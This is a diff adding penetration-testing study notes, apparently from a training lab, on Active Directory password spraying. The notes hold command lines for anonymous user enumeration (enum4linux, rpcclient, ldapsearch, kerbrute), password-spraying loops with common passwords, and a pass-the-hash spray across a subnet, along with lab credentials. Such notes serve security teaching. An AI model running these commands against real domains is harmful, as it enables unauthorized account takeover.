@@ -273,6 +273,81 @@ Account lockout threshold	0
 Reset account lockout counter after	Not set
 
 **Password Spraying - Making a Target User List**
+- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
+- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
+- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo
+
+**SMB NULL Session to Pull User List**
+
+> enum4linux, rpcclient, and CrackMapExec,
+
+```
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+```
+rpcclient -U "" -N 172.16.5.5
+> enumdomusers
+```
+
+*Finally, we can use CrackMapExec with the --users flag. This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.*
+
+```
+crackmapexec smb 172.16.5.5 --users
+```
+
+- windapsearch and ldapsearch
+
+```
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+```
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+```
+
+```
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+```
+
+We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.
+
+*already have credentials for a domain user or SYSTEM access on a Windows host. It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts).*
+
+**Credentialed Enumeration to Build our User List**
+
+```
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+```
+
+**Internal Password Spraying - from Linux**
+
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+```
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+```
+Validating the Credentials with CrackMapExec:
+```
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+```
+
+**Local Administrator Password Reuse !!!!!!**
+
+Internal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network. 
+
+Also, if we find non-standard local administrator accounts such as bsmith, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named ajones, it is worth trying the same password on their admin account (if the user has one), for example, ajones_adm, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.
+
+Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.
+
+```
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
+**Internal Password Spraying - from Windows**
 
 
 
